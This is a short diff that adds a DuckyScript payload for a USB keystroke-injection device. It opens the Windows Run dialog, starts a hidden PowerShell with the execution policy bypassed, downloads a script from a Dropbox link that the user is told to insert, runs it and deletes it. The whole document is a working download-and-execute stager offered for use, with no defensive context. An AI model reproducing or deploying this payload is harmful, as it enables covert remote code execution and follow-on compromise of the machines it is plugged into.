@@ -1,0 +1,5 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass "$e=\"$env:TMP/e.ps1\";iwr (PUT YOUR DROPBOX LINK HERE REMOVE EVERYTHING FROM THE LINK STARTING AT ?dl=0)
+STRING ?dl=1 -O $e;iex $e;rm $e"
+ENTER
